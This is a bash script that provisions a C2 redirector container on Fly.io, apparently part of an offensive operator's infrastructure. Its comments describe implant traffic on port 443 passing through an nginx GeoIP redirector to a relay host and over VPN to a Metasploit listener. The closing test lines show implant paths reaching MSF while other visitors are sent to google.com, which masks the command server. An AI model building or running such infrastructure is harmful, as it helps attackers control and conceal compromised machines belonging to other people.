#!/bin/bash
# provision-redirector.sh — Provision a new C2 redirector container (Fly.io)
#
# Usage: ./provision-redirector.sh <name> <region>
#
# Examples:
#   ./provision-redirector.sh redirector-1 cdg     # Paris
#   ./provision-redirector.sh redirector-2 ams     # Amsterdam
#   ./provision-redirector.sh redirector-3 lhr     # London
#
# Architecture:
#   Implant :443 → Redirecteur (nginx GeoIP) → bojemoi.me:8443 → VPN → 192.168.1.47:4444
#
# Prerequisites:
#   - fly CLI installed + authenticated (fly auth login)
#   - Image built: docker build -t localhost:5000/c2-redirector:latest redirector/
#   - fly app created: fly apps create <name>
#
# Output:
#   /opt/bojemoi/volumes/c2-vpn/redirectors/<name>.json   — registry entry

set -euo pipefail

NAME="${1:-}"
REGION="${2:-cdg}"

if [ -z "$NAME" ]; then
    echo "Usage: $0 <name> [region]"
    echo "  region: cdg (Paris), ams (Amsterdam), lhr (London), fra (Frankfurt)"
    echo "          mad (Madrid), mia (Miami), ord (Chicago), sjc (San Jose)"
    exit 1
fi

REGISTRY_DIR="/opt/bojemoi/volumes/c2-vpn/redirectors"
LOCAL_IMAGE="localhost:5000/c2-redirector:latest"
FLY_IMAGE="registry.fly.io/${NAME}:latest"
RELAY_HOST="bojemoi.me"
RELAY_PORT="8443"
PROVIDER="fly.io"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
log()  { echo -e "${GREEN}[+]${NC} $*"; }
info() { echo -e "${CYAN}[i]${NC} $*"; }

mkdir -p "$REGISTRY_DIR"

# ── Tag + push image to Fly registry ─────────────────────────────────────────
log "Tagging $LOCAL_IMAGE → $FLY_IMAGE..."
docker tag "$LOCAL_IMAGE" "$FLY_IMAGE"

log "Pushing to Fly.io registry (requires: fly auth docker)..."
docker push "$FLY_IMAGE" 2>&1

# ── Deploy on Fly.io ──────────────────────────────────────────────────────────
log "Deploying machine on Fly.io (region: $REGION)..."
fly machine run "$FLY_IMAGE" \
    --app "$NAME" \
    --region "$REGION" \
    --port 80:80/tcp \
    --port 443:443/tcp \
    --vm-size shared-cpu-1x \
    --vm-memory 256 2>&1

# ── Get public IP ─────────────────────────────────────────────────────────────
log "Fetching public IP..."
sleep 5
IP=$(fly ips list --app "$NAME" --json 2>/dev/null | \
     grep -o '"Address":"[^"]*"' | head -1 | cut -d'"' -f4 || echo "")

# ── Save to registry ──────────────────────────────────────────────────────────
cat > "$REGISTRY_DIR/${NAME}.json" << REGEOF
{
  "name": "$NAME",
  "provider": "$PROVIDER",
  "region": "$REGION",
  "relay": "${RELAY_HOST}:${RELAY_PORT}",
  "created": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "ip": "${IP}"
}
REGEOF

echo ""
echo -e "${CYAN}══════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  $NAME | fly.io | $REGION | ${IP:--}${NC}"
echo -e "${CYAN}══════════════════════════════════════════════════════${NC}"
echo ""
log "Registry: $REGISTRY_DIR/${NAME}.json"
echo ""
echo -e "${YELLOW}Test (30s après démarrage):${NC}"
echo "  curl -4 -sk https://${IP:-<ip>}/api/update  # → doit atteindre MSF"
echo "  curl -4 -sk https://${IP:-<ip>}/            # → 302 google.com"
